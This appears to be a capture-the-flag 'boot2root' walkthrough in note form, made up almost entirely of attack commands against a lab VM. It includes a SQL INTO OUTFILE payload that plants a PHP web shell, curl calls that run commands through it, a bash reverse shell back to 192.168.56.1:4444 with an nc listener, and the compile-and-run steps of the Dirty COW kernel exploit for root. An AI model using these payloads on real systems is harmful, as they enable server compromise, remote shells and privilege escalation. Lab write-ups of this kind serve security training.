https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt

VBoxManage modifyvm "boot2root" --nic2 hostonly --hostonlyadapter2 vboxnet0
VBoxManage startvm "boot2root" --type headless

SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/forum/templates_c/shell.php'; 

# test if injection is done
 curl --insecure 'https://192.168.56.102/forum/templates_c/shell.php?cmd=ls%20-la'

#REVERS SHELL 
curl --insecure 'https://192.168.56.102/forum/templates_c/shell.php?cmd=bash%20-c%20%27sh%20-i%20>%26%20/dev/tcp/192.168.56.1/4444%200>%261%27'

nc -lvnp 4444 

https://www.exploit-db.com/

lsb_release -d --> https://github.com/nirae/boot2root/blob/master/scripts/dirty.c 

gcc -pthread dirty.c -o dirty -lcrypt

./dirty

python -c 'import pty; pty.spawn("/bin/bash")' 
